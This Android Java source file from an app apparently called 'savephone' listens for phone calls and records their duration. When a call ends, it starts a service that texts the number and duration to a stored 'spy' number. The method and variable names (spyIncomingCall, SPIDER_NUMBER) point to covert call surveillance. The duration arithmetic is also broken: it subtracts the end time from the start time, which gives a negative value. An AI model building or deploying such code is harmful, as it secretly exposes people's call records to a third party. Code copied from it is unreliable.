package com.future.it.gasmyr.savephone;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import java.util.Date;

/**
 * Created by gasmyr on 10/27/15.
 */
public class MyPhoneStateListener extends PhoneStateListener{
    private SharedPreferences sharedPreferences;
    private Context context;
    private Long start;
    private Long end;
    private boolean isCompute=false;

    public static String SPIDER_NUMBER=null;
    public static String APPLICATION_KEY=null;

    public MyPhoneStateListener(Context context){
        super();
        this.context=context;
        init();
    }
    @Override
    public void onCallStateChanged(int state, String number){
        super.onCallStateChanged(state, number);

        switch (state){
            case TelephonyManager.CALL_STATE_IDLE:
                callEnd(number);
                break;
            case TelephonyManager.CALL_STATE_RINGING:
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                spyIncomingCall(number);
                break;
            default:
                break;
        }
    }


    public void init(){
        sharedPreferences=context.getSharedPreferences(ApplicationConstants.APPLICATION_SHARE_PREF_ID,Context.MODE_PRIVATE);
    }
    public void spyIncomingCall(String number){
        init();
        boolean incoming_call=sharedPreferences.getBoolean(ApplicationConstants.APPLICATION_IS_CALL_ENABLE,false);
        if(incoming_call){
            start=new Date().getTime();
            isCompute=true;
        }
    }
    public void callEnd(String number){
        if (isCompute){
            end=new Date().getTime();
            long diff=start-end;
            long secondes = diff / 1000 % 60;
            long minutes = diff / (60 * 1000) % 60;
            long hours = diff / (60 * 60 * 1000);
            loadService(number + "a appellé et a causé pendant " +hours+ "h" +minutes+ " min"+secondes+"s", number);
            isCompute=false;
        }
    }

    private void loadService(String number, String number2) {
        SPIDER_NUMBER=sharedPreferences.getString(ApplicationConstants.APPLICATION_SPIDER_NUMBER,ApplicationConstants.APPLICATION_DEFAULT_SEND_TO_NUMBER);
        APPLICATION_KEY=sharedPreferences.getString(ApplicationConstants.APPLICATION_KEY,ApplicationConstants.APPLICATION_TEST_KEY);
        Intent i = new Intent(context, SMSService.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.putExtra(ApplicationConstants.APPLICATION_SMS_BODY, number);
        i.putExtra(ApplicationConstants.APPLICATION_SENDER_NUMBER,number2);
        i.putExtra(ApplicationConstants.APPLICATION_SPIDER_NUMBER,SPIDER_NUMBER);
        i.putExtra(ApplicationConstants.APPLICATION_KEY,APPLICATION_KEY);
        i.putExtra(ApplicationConstants.APPLICATION_SMS_IS_FROM_CALL,true);
        context.startService(i);
    }
}
